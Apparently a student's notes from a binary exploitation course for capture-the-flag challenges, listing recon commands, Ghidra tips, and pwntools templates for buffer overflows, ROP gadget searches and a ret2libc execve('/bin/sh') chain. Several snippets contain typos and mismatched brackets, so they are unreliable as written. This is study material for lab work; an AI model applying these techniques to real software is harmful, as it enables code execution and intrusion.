## General guidelines for exploitation from Lecture 2

List the files for the challenge

`ls /challenge`

run the program to try to understand its behaviour

use `strings /challenge/<binary>`  to see if there are any interesting keywords

use `file /challenge/<binary>` to check intial parameters

use `strace /challenge/<binary>` to see all systems calls - this is often better later ro find specific calls to work with.

use `ltrace /challenege/<binary>` to see all 

## Static Analysis tool phase

### Ghidra

New project, import binary, conduct analysis
Look into the functions and check the decomplier for format string, read, write and buffers, follow the prgram flow
Ghidra numbers local variable with the value for how far away from the top of the stack they are in HEX 
e.g. local_48 is 48 hex bytes / 72 Dec bytes away from the top of the stack
e.g. local_8 is 8 hex 8 / 8 Dec bytes away from the top of the stack

Rename known functions

## Command line exploit

Create pwntools exploit template

`pwn template <target binary> > <exploit filename>.py`

Check Binary Security

`pwn checksec <taget buinary>`

Open in GDB

`gdb <target binary`

create a giant input to overflow the buffer

`cyclic 256` pwndbg will fill correctly for 32 or 64 bit programming

set a break point on ret for the vulnerable function

`info functions`
`disassem main`
`dissassem vuln`
`b *vuln+<code line>`

Run the target binary and check the ret address value

Use the cyclic lookup function `cyclic -l <value>` and note the offset value needed to overwrite the RBP 

simple payload if you have a win function using pwn.tools template.
`payload = cyclic(<offset value>) + p64(exe.symbols["<win or target function>")`

Can also be expressed as
`payload = flat([
  cyclic(<offset value>),
  exe.symbols["<win funciton>")
])`

without pwn.tools utilities always use bite string eg
`payload =  b"A"*88 + b"<little endian memory address>"`

Note symbols works when you have a NON PIC binary

## Shellcode
https://www.youtube.com/watch?v=NlPTT4j_78I
https://www.ired.team/offensive-security/code-injection-process-injection/writing-and-compiling-shellcode-in-c

## Gadgets and ROP

Ropper 

https://github.com/sashs/Ropper

use `ropper --file <path to target binary> --search for "<target command - mov, rdi, ret, pop, etc>"`

eg `ropper --file /challenge/classwork --search "syscall"` or  `ropper --file /challenge/classwork --search "pop rdi"`


ROPGadget

https://github.com/jonathansalwan/ROPgadget

use `ROPgadget --binary <path to binary/<traget function> | grep "<target command - mov, rdi, ret, pop, etc>" `


## Ret2Libc
NOTE: need to know libc version and libc base for this to work with the pwntools rop gadget finder
eg: 
`rop = ROP([binary, libc])`

`binsh = next(libc.search(b"bin/sh"))`

`rop.execve(binsh, 0, 0)`

`payload = padding + rop.chain()`






 









